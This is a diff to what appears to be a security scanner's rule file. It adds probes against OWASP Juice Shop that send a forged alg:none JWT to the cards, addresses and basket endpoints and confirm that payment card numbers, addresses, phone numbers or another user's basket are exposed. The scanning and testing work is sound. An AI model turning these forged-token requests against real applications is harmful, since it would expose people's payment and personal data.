@@ -37098,6 +37098,143 @@ const juiceShopRecyclesBolaRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const juiceShopCardsBolaLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/api/Cards", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    maxBytes: 8192,
+    headers: juiceShopAlgNoneAuthHeader()
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"data"\s*:\s*\[/.test(doc.body)) return NEGATIVE;
+  const cardNums = [...doc.body.matchAll(/"cardNum"\s*:\s*"([^"]+)"/g)].map((m) => m[1]);
+  const fullNames = [...doc.body.matchAll(/"fullName"\s*:\s*"([^"]+)"/g)].map((m) => m[1]);
+  if (cardNums.length < 1 || fullNames.length < 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: cardNums.length >= 2 ? 0.93 : 0.91,
+    evidence: {
+      url,
+      cardCount: cardNums.length,
+      fullNames: fullNames.slice(0, 3),
+      cardNumSample: cardNums[0],
+      snippet: doc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET /api/Cards with alg:none JWT returns stored payment card records — PCI-sensitive BOLA oracle"
+    }
+  };
+};
+
+const juiceShopCardsBolaRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/api\/Cards\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopCardsBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /api/Cards route scan — alg:none JWT lists payment card records — route-specific BOLA oracle"
+    }
+  };
+};
+
+const juiceShopAddresssBolaLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const url = new URL("/api/Addresss", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    maxBytes: 8192,
+    headers: juiceShopAlgNoneAuthHeader()
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"data"\s*:\s*\[/.test(doc.body)) return NEGATIVE;
+  const streetMatch = doc.body.match(/"streetAddress"\s*:\s*"([^"]{4,})"/);
+  const mobileMatch = doc.body.match(/"mobileNum"\s*:\s*(\d{6,})/);
+  if (!streetMatch || !mobileMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url,
+      streetAddress: streetMatch[1],
+      mobileNum: mobileMatch[1],
+      snippet: doc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET /api/Addresss with alg:none JWT returns shipping addresses with street and mobile number — PII BOLA oracle"
+    }
+  };
+};
+
+const juiceShopAddresssBolaRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/api\/Addresss\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopAddresssBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /api/Addresss route scan — alg:none JWT lists shipping addresses with PII — route-specific BOLA oracle"
+    }
+  };
+};
+
+const juiceShopBasketIdorLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  const authHeader = juiceShopAlgNoneAuthHeader();
+  const ownUrl = new URL("/rest/basket/1", ctx.origin).toString();
+  const victimUrl = new URL("/rest/basket/2", ctx.origin).toString();
+  const [unauthDoc, ownDoc, victimDoc] = await Promise.all([
+    ctx.probe.get(victimUrl, { maxBytes: 4096 }),
+    ctx.probe.get(ownUrl, { maxBytes: 4096, headers: authHeader }),
+    ctx.probe.get(victimUrl, { maxBytes: 4096, headers: authHeader })
+  ]);
+  if (!looksAuthChallenge(unauthDoc)) return NEGATIVE;
+  if (ownDoc.status < 200 || ownDoc.status >= 400 || victimDoc.status < 200 || victimDoc.status >= 400) {
+    return NEGATIVE;
+  }
+  const ownUserId = ownDoc.body.match(/"UserId"\s*:\s*(\d+)/)?.[1];
+  const victimUserId = victimDoc.body.match(/"UserId"\s*:\s*(\d+)/)?.[1];
+  if (!ownUserId || !victimUserId || ownUserId === victimUserId) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      ownUrl,
+      victimUrl,
+      ownUserId,
+      victimUserId,
+      unauthStatus: unauthDoc.status,
+      snippet: victimDoc.body.slice(0, 180).trim(),
+      note: "Juice Shop GET /rest/basket/2 with alg:none JWT returns another user's basket (UserId mismatch) — basket IDOR oracle"
+    }
+  };
+};
+
+const juiceShopBasketIdorRouteLiveOracle: Rule = async (ctx) => {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!JUICE_SHOP_HOST_RE.test(`${ctx.origin}\n${pageUrl}`)) return NEGATIVE;
+  if (!/\/rest\/basket\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const result = await juiceShopBasketIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Juice Shop /rest/basket/:id route scan — alg:none JWT reads another user's basket — route-specific IDOR oracle"
+    }
+  };
+};
+
 function wrongsecretsChallengeIdFromUrl(url: string): string | null {
   const m = url.match(/\/challenge\/(?:challenge-)?(\d+)\/?(?:\?|#|$)/i);
   return m?.[1] ?? null;
@@ -45759,6 +45896,12 @@ export const RULES: Record<string, Rule> = {
   juiceShopSecurityQuestionsListRouteLiveOracle,
   juiceShopRecyclesBolaLiveOracle,
   juiceShopRecyclesBolaRouteLiveOracle,
+  juiceShopCardsBolaLiveOracle,
+  juiceShopCardsBolaRouteLiveOracle,
+  juiceShopAddresssBolaLiveOracle,
+  juiceShopAddresssBolaRouteLiveOracle,
+  juiceShopBasketIdorLiveOracle,
+  juiceShopBasketIdorRouteLiveOracle,
   wrongsecretsChallengeLiveOracle,
   wrongsecretsChallengeRouteLiveOracle,
   clientSideVulnlabApiLabsEvidence,
